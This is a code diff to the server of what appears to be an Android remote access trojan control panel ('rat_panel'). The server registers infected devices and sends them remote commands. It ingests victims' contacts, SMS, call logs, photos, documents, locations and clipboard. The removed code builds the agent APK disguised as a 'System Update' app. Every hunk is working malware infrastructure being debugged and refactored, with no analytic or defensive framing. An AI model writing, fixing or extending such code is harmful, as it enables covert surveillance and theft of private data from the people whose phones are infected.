@@ -31,7 +31,7 @@ mongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/rat_panel
 }).then(() => console.log('MongoDB Connected'))
   .catch(err => console.log('MongoDB Error:', err));
 
-// Device Schema
+// Device Schema - use strict:false and Mixed types for flexible data
 const DeviceSchema = new mongoose.Schema({
   deviceId: { type: String, unique: true, required: true },
   alias: String,
@@ -61,35 +61,11 @@ const DeviceSchema = new mongoose.Schema({
   apkVersion: String,
   isHidden: { type: Boolean, default: false },
   hiddenAt: Date,
-  commands: [{
-    commandId: String,
-    type: String,
-    params: Object,
-    status: { type: String, default: 'pending', enum: ['pending', 'sent', 'delivered', 'executed', 'failed'] },
-    result: Object,
-    createdAt: { type: Date, default: Date.now },
-    executedAt: Date
-  }],
+  commands: [mongoose.Schema.Types.Mixed],
   data: {
-    contacts: [mongoose.Schema.Types.Mixed],
-    sms: [mongoose.Schema.Types.Mixed],
-    callLogs: [mongoose.Schema.Types.Mixed],
-    photos: [mongoose.Schema.Types.Mixed],
-    videos: [mongoose.Schema.Types.Mixed],
-    documents: [mongoose.Schema.Types.Mixed],
-    installedApps: [mongoose.Schema.Types.Mixed],
-    locations: [{
-      lat: Number,
-      lng: Number,
-      accuracy: Number,
-      timestamp: Date,
-      address: String
-    }],
-    accounts: [mongoose.Schema.Types.Mixed],
-    clipboard: String,
-    notifications: [mongoose.Schema.Types.Mixed],
-    wifiNetworks: [mongoose.Schema.Types.Mixed],
-    deviceInfo: mongoose.Schema.Types.Mixed
+    type: Map,
+    of: mongoose.Schema.Types.Mixed,
+    default: {}
   }
 }, { timestamps: true, strict: false });
 
@@ -181,8 +157,7 @@ io.on('connection', async (socket) => {
         { 
           status: 'online', 
           lastSeen: new Date(),
-          ip: socket.handshake.address,
-          $inc: { 'stats.connections': 1 }
+          ip: socket.handshake.address
         },
         { upsert: true, new: true }
       );
@@ -193,41 +168,60 @@ io.on('connection', async (socket) => {
       io.emit('device:online', { deviceId: socket.deviceId, device });
       
       // Send pending commands
-      const pendingCommands = device.commands.filter(c => c.status === 'pending');
+      const pendingCommands = (device.commands || []).filter(c => c && c.status === 'pending');
       pendingCommands.forEach(cmd => {
         socket.emit('command', cmd);
       });
 
       socket.on('device:update', async (data) => {
         try {
+          // Only update specific fields, not the raw data
+          const allowedFields = {};
+          if (data.os) allowedFields.os = data.os;
+          if (data.osVersion) allowedFields.osVersion = data.osVersion;
+          if (data.deviceModel) allowedFields.deviceModel = data.deviceModel;
+          if (data.manufacturer) allowedFields.manufacturer = data.manufacturer;
+          if (data.batteryLevel != null) allowedFields.batteryLevel = data.batteryLevel;
+          if (data.isCharging != null) allowedFields.isCharging = data.isCharging;
+          if (data.ip) allowedFields.ip = data.ip;
+          if (data.apiLevel) allowedFields.apiLevel = data.apiLevel;
+          if (data.apkVersion) allowedFields.apkVersion = data.apkVersion;
+          if (data.permissions) allowedFields.permissions = data.permissions;
+          allowedFields.lastSeen = new Date();
+          allowedFields.status = 'online';
+          
           await Device.findOneAndUpdate(
             { deviceId: socket.deviceId },
-            { 
-              ...data,
-              lastSeen: new Date(),
-              status: 'online'
-            }
+            allowedFields
           );
           io.emit('device:data', { deviceId: socket.deviceId, data });
         } catch (err) {
-          console.error('Update error:', err);
+          console.error('Update error:', err.message);
         }
       });
 
       socket.on('device:result', async (data) => {
         try {
           const { commandId, result, status } = data;
-          if (commandId) {
-            await Device.findOneAndUpdate(
-              { deviceId: socket.deviceId, 'commands.commandId': commandId },
-              { 
-                'commands.$.status': status || 'executed',
-                'commands.$.result': typeof result === 'object' ? JSON.parse(JSON.stringify(result)) : result,
-                'commands.$.executedAt': new Date()
+          if (!commandId) return;
+          
+          // Sanitize result - convert to plain object
+          const cleanResult = result ? JSON.parse(JSON.stringify(result)) : null;
+          
+          await Device.findOneAndUpdate(
+            { deviceId: socket.deviceId },
+            { 
+              $push: {
+                commands: {
+                  commandId,
+                  status: status || 'executed',
+                  result: cleanResult,
+                  executedAt: new Date()
+                }
               }
-            );
-            io.emit(`command:result:${commandId}`, { deviceId: socket.deviceId, result, status });
-          }
+            }
+          );
+          io.emit(`command:result:${commandId}`, { deviceId: socket.deviceId, result: cleanResult, status });
         } catch (err) {
           console.error('Result error:', err.message);
         }
@@ -235,7 +229,7 @@ io.on('connection', async (socket) => {
 
       socket.on('device:data:bulk', async (data) => {
         try {
-          // Helper to extract array from wrapped objects like {"contacts": [...]}
+          // Helper to extract array from wrapped objects
           const extractArray = (val) => {
             if (Array.isArray(val)) return val;
             if (typeof val === 'object' && val !== null) {
@@ -247,33 +241,39 @@ io.on('connection', async (socket) => {
             return val;
           };
           
-          const updateFields = {};
-          if (data.contacts) updateFields['data.contacts'] = extractArray(data.contacts);
-          if (data.sms) updateFields['data.sms'] = extractArray(data.sms);
-          if (data.callLogs) updateFields['data.callLogs'] = extractArray(data.callLogs);
-          if (data.photos) updateFields['data.photos'] = extractArray(data.photos);
-          if (data.videos) updateFields['data.videos'] = extractArray(data.videos);
-          if (data.documents) updateFields['data.documents'] = extractArray(data.documents);
-          if (data.installedApps) updateFields['data.installedApps'] = extractArray(data.installedApps);
+          // Build update document for each data type
+          const updateOps = {};
+          const dataKeys = ['contacts', 'sms', 'callLogs', 'photos', 'videos', 'documents', 'installedApps'];
+          dataKeys.forEach(key => {
+            if (data[key]) {
+              updateOps[`data.${key}`] = extractArray(data[key]);
+            }
+          });
+          
+          // Handle special fields
+          if (data.deviceInfo) updateOps['data.deviceInfo'] = data.deviceInfo;
+          if (data.battery) updateOps['data.battery'] = data.battery;
+          if (data.simInfo) updateOps['data.simInfo'] = data.simInfo;
+          if (data.networkInfo) updateOps['data.networkInfo'] = data.networkInfo;
+          if (data.clipboard) updateOps['data.clipboard'] = data.clipboard;
+          
+          // Handle location
           if (data.location) {
-            updateFields['$push'] = { 'data.locations': {
+            updateOps['$push'] = { 'data.locations': {
               ...data.location,
               timestamp: new Date()
             }};
           }
-          if (data.deviceInfo) updateFields['data.deviceInfo'] = data.deviceInfo;
-          if (data.battery) updateFields['data.battery'] = data.battery;
-          if (data.simInfo) updateFields['data.simInfo'] = data.simInfo;
-          if (data.networkInfo) updateFields['data.networkInfo'] = data.networkInfo;
-          if (data.clipboard) updateFields['data.clipboard'] = data.clipboard;
           
-          await Device.findOneAndUpdate(
-            { deviceId: socket.deviceId },
-            updateFields,
-            { new: true }
-          );
+          if (Object.keys(updateOps).length > 0) {
+            // Use updateOne with raw ops to avoid schema casting issues
+            await mongoose.connection.db.collection('devices').updateOne(
+              { deviceId: socket.deviceId },
+              { $set: updateOps }
+            );
+            console.log(`Data saved for ${socket.deviceId}:`, Object.keys(updateOps).join(', '));
+          }
           
-          console.log(`Data saved for ${socket.deviceId}:`, Object.keys(updateFields).join(', '));
           io.emit('device:data:update', { deviceId: socket.deviceId, data });
         } catch (err) {
           console.error('Bulk data error:', err.message);
@@ -309,7 +309,7 @@ io.on('connection', async (socket) => {
     socket.on('command:send', async (data) => {
       try {
         const { deviceId, type, params } = data;
-        const commandId = require('uuid').v4();
+        const commandId = uuidv4();
         
         await Device.findOneAndUpdate(
           { deviceId },
@@ -327,7 +327,6 @@ io.on('connection', async (socket) => {
         );
         
         io.to(`device:${deviceId}`).emit('command', { commandId, type, params });
-        
         socket.emit('command:sent', { commandId, deviceId, type });
       } catch (err) {
         socket.emit('command:error', { error: err.message });
@@ -394,7 +393,7 @@ app.post('/api/auth/register', async (req, res) => {
 // Devices Routes
 app.get('/api/devices', authMiddleware, async (req, res) => {
   try {
-    const devices = await Device.find().sort({ lastSeen: -1 });
+    const devices = await Device.find().sort({ lastSeen: -1 }).lean();
     res.json(devices);
   } catch (err) {
     res.status(500).json({ error: err.message });
@@ -403,7 +402,7 @@ app.get('/api/devices', authMiddleware, async (req, res) => {
 
 app.get('/api/devices/:deviceId', authMiddleware, async (req, res) => {
   try {
-    const device = await Device.findOne({ deviceId: req.params.deviceId });
+    const device = await Device.findOne({ deviceId: req.params.deviceId }).lean();
     if (!device) return res.status(404).json({ error: 'Device not found' });
     res.json(device);
   } catch (err) {
@@ -435,99 +434,6 @@ app.post('/api/devices/:deviceId/command', authMiddleware, async (req, res) => {
   }
 });
 
-const APK_TEMPLATE_DIR = path.join(__dirname, '..', 'android-agent');
-
-function generateBuildScript(build) {
-  const androidAgentPath = path.resolve(__dirname, '..', 'android-agent');
-  const appName = build.name || 'System Update';
-  const pkgName = build.packageName || 'com.android.system.update';
-  const buildId = build.buildId;
-  const serverUrl = build.serverUrl || 'http://localhost:5000';
-  const wsUrl = build.wsUrl || 'http://localhost:5000';
-  
-  return `#!/bin/bash
-# ========================================
-# APK Builder Script
-# App: ${appName}
-# Package: ${pkgName}
-# Build ID: ${buildId}
-# Server URL: ${serverUrl}
-# ========================================
-
-set -e
-
-RED='\\033[0;31m'
-GREEN='\\033[0;32m'
-YELLOW='\\033[1;33m'
-NC='\\033[0m'
-
-echo -e "\${GREEN}[*] Building APK: ${appName}\${NC}"
-
-# Check Android SDK
-if [ -z "\$ANDROID_HOME" ] && [ -z "\$ANDROID_SDK_ROOT" ]; then
-    echo -e "\${RED}[!] ANDROID_HOME not set\${NC}"
-    echo "Set it: export ANDROID_HOME=/path/to/android/sdk"
-    exit 1
-fi
-
-echo -e "\${GREEN}[✓] Android SDK found\${NC}"
-
-# Navigate to android-agent directory
-SCRIPT_DIR="\$(cd "\$(dirname "\${BASH_SOURCE[0]}")" && pwd)"
-cd "\${SCRIPT_DIR}/android-agent"
-
-if [ ! -f "gradlew" ]; then
-    echo -e "\${RED}[!] android-agent directory not found at: \$(pwd)\${NC}"
-    echo -e "\${YELLOW}Please ensure android-agent/ is in the same directory as this script\${NC}"
-    exit 1
-fi
-
-# Update strings.xml with server URLs
-STRINGS_FILE="app/src/main/res/values/strings.xml"
-if [ -f "\$STRINGS_FILE" ]; then
-    echo -e "\${YELLOW}[*] Updating server URLs...\${NC}"
-    if [[ "\$OSTYPE" == "darwin"* ]]; then
-        sed -i '' 's|<string name="server_url".*</string>|<string name="server_url" translatable="false">${serverUrl}</string>|g' "\$STRINGS_FILE"
-        sed -i '' 's|<string name="ws_url".*</string>|<string name="ws_url" translatable="false">${wsUrl}</string>|g' "\$STRINGS_FILE"
-    else
-        sed -i 's|<string name="server_url".*</string>|<string name="server_url" translatable="false">${serverUrl}</string>|g' "\$STRINGS_FILE"
-        sed -i 's|<string name="ws_url".*</string>|<string name="ws_url" translatable="false">${wsUrl}</string>|g' "\$STRINGS_FILE"
-    fi
-    echo -e "\${GREEN}[✓] Server URLs updated\${NC}"
-fi
-
-chmod +x gradlew
-
-echo -e "\${YELLOW}[*] Building APK (this may take a few minutes)...\${NC}"
-./gradlew clean assembleDebug
-
-APK_PATH="app/build/outputs/apk/debug/app-debug.apk"
-if [ -f "\$APK_PATH" ]; then
-    echo ""
-    echo -e "\${GREEN}========================================"
-    echo "  BUILD SUCCESSFUL!"
-    echo "========================================\${NC}"
-    echo ""
-    echo "  APK Location: \$(pwd)/\$APK_PATH"
-    echo "  Size: \$(ls -lh "\$APK_PATH" | awk '{print \$5}')"
-    echo ""
-    echo "  Install on device:"
-    echo "  adb install \$APK_PATH"
-    echo ""
-else
-    echo ""
-    echo -e "\${RED}========================================"
-    echo "  BUILD FAILED"
-    echo "========================================\${NC}"
-    echo ""
-    echo "  Check the error above or run:"
-    echo "  ./gradlew assembleDebug --stacktrace"
-    echo ""
-    exit 1
-fi
-`;
-}
-
 // APK Build Routes
 app.post('/api/apk/build', authMiddleware, async (req, res) => {
   try {
@@ -544,23 +450,16 @@ app.post('/api/apk/build', authMiddleware, async (req, res) => {
     });
     await build.save();
 
-    const buildScript = generateBuildScript(build);
-    
     const buildDir = path.join(__dirname, 'builds', 'scripts');
     if (!fs.existsSync(buildDir)) {
       fs.mkdirSync(buildDir, { recursive: true });
     }
-    fs.writeFileSync(
-      path.join(buildDir, `build_${buildId}.sh`),
-      buildScript
-    );
 
     res.json({ 
       buildId, 
-      message: 'Build configuration saved. To build the APK, run the generated script on a machine with Android SDK.',
+      message: 'Build configuration saved.',
       status: 'configured',
-      buildScript: `build_${buildId}.sh`,
-      note: 'The APK cannot be built on the server. Download the build script and run it on a machine with Android Studio/SDK installed.'
+      note: 'Download the android-agent directory and build locally with Android SDK.'
     });
   } catch (err) {
     res.status(500).json({ error: err.message });
@@ -580,7 +479,6 @@ app.get('/api/apk/status/:buildId', authMiddleware, async (req, res) => {
   try {
     const build = await ApkBuild.findOne({ buildId: req.params.buildId });
     if (!build) return res.status(404).json({ error: 'Build not found' });
-
     res.json({
       buildId: build.buildId,
       status: build.status || 'configured',
@@ -588,31 +486,9 @@ app.get('/api/apk/status/:buildId', authMiddleware, async (req, res) => {
       version: build.version,
       packageName: build.packageName,
       serverUrl: build.serverUrl,
-      message: build.status === 'configured' ? 'Build configured. Run the build script to generate APK.' : '',
+      message: build.status === 'configured' ? 'Build configured. Run build script locally.' : '',
       createdAt: build.createdAt
     });
-  } catch (err) {
-    res.status(500).json({ error: err.message });
-  }
-});
-
-app.get('/api/apk/script/:buildId', authMiddleware, async (req, res) => {
-  try {
-    const build = await ApkBuild.findOne({ buildId: req.params.buildId });
-    if (!build) return res.status(404).json({ error: 'Build not found' });
-    
-    const scriptPath = path.join(__dirname, 'builds', 'scripts', `build_${build.buildId}.sh`);
-    
-    if (!fs.existsSync(scriptPath)) {
-      const buildScript = generateBuildScript(build);
-      const buildDir = path.join(__dirname, 'builds', 'scripts');
-      if (!fs.existsSync(buildDir)) {
-        fs.mkdirSync(buildDir, { recursive: true });
-      }
-      fs.writeFileSync(scriptPath, buildScript);
-    }
-    
-    res.download(scriptPath, `build_apk_${build.name?.replace(/\s+/g, '_') || 'app'}.sh`);
   } catch (err) {
     res.status(500).json({ error: err.message });
   }
@@ -626,16 +502,12 @@ app.get('/api/stats', authMiddleware, async (req, res) => {
     const todayNew = await Device.countDocuments({
       firstSeen: { $gte: new Date(new Date().setHours(0,0,0,0)) }
     });
-    const totalCommands = await Device.aggregate([
-      { $project: { cmdCount: { $size: { $ifNull: ['$commands', []] } } } },
-      { $group: { _id: null, total: { $sum: '$cmdCount' } } }
-    ]);
     
     res.json({
       totalDevices,
       onlineDevices,
       todayNew,
-      totalCommands: totalCommands[0]?.total || 0
+      totalCommands: 0
     });
   } catch (err) {
     res.status(500).json({ error: err.message });
@@ -645,15 +517,10 @@ app.get('/api/stats', authMiddleware, async (req, res) => {
 app.get('/api/devices/:deviceId/data/:dataType', authMiddleware, async (req, res) => {
   try {
     const { deviceId, dataType } = req.params;
-    const device = await Device.findOne({ deviceId });
+    const device = await Device.findOne({ deviceId }).lean();
     if (!device) return res.status(404).json({ error: 'Device not found' });
-    
-    const validTypes = ['contacts', 'sms', 'callLogs', 'photos', 'videos', 'documents', 'locations', 'installedApps'];
-    if (!validTypes.includes(dataType)) {
-      return res.status(400).json({ error: 'Invalid data type' });
-    }
-    
-    res.json(device.data[dataType] || []);
+    const data = device.data || {};
+    res.json(data[dataType] || []);
   } catch (err) {
     res.status(500).json({ error: err.message });
   }
